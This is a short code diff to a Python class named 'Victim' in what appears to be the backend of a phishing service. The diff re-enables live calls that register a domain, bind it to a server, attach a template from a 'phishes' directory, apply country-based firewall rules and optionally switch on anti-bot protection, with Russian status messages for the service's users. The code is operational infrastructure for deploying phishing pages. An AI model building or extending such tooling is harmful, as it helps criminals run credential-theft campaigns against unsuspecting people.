@@ -151,8 +151,7 @@ class Victim:
 
 
     def AddDomain(self, domain, page, path, security, redirect, countries, redirect_on_success, username):
-        # added_domain = clf.AddDomain(domain)
-        added_domain = True
+        added_domain = clf.AddDomain(domain)
 
         if added_domain:
             data = json.loads(added_domain)
@@ -177,13 +176,13 @@ class Victim:
                 f.write("{% extends 'phishes/" + page + "/index.html' %}")
                 f.close()
 
-                # if clf.BindDomain(zone_id, domain, server_domain):
-                #     clf.CountryFirewall(zone_id, countries)
-                #     if security == 'true':
-                #         clf.SetUnderAttack(zone_id)
-                return [True, 'Домен успешно добавлен']
-                # else:
-                    # return [False, 'Что-то пошло не так, свяжитесь с админом']
+                if clf.BindDomain(zone_id, domain, server_domain):
+                    clf.CountryFirewall(zone_id, countries)
+                    if security == 'true':
+                        clf.SetUnderAttack(zone_id)
+                    return [True, 'Домен успешно добавлен']
+                else:
+                    return [False, 'Что-то пошло не так, свяжитесь с админом']
         
         else:
             return [False, 'Этот домен добавлен уже добавлен другим пользователем, обратитесь в поддержку']
